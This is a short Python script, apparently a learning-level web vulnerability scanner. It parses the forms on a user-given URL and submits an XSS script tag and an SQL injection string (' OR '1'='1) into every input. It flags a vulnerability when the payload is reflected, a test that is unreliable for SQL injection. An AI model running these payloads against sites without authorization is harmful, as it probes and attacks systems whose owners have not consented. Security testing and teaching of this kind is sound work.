import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Simple payloads
payloads = {
    "XSS": "<script>alert('XSS')</script>",
    "SQLi": "' OR '1'='1"
}

def find_forms(url):
    soup = BeautifulSoup(requests.get(url).text, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    action = form.get("action")
    method = form.get("method", "get").lower()
    inputs = [tag.get("name") for tag in form.find_all("input") if tag.get("name")]
    return action, method, inputs

def submit_form(url, action, method, inputs, payload):
    data = {name: payload for name in inputs}
    target = urljoin(url, action)
    if method == "post":
        return requests.post(target, data=data)
    else:
        return requests.get(target, params=data)

def scan(url):
    print(f"Scanning: {url}")
    forms = find_forms(url)
    print(f"Found {len(forms)} form(s).")

    for i, form in enumerate(forms):
        action, method, inputs = get_form_details(form)
        print(f"\nForm #{i+1} -> Action: {action}, Method: {method}, Inputs: {inputs}")
        for vuln, payload in payloads.items():
            res = submit_form(url, action, method, inputs, payload)
            if payload in res.text:
                print(f"[!] {vuln} vulnerability detected using payload: {payload}")
            else:
                print(f"[ ] {vuln} payload not reflected.")

if __name__ == "__main__":
    target = input("Enter URL to scan: ").strip()
    scan(target)

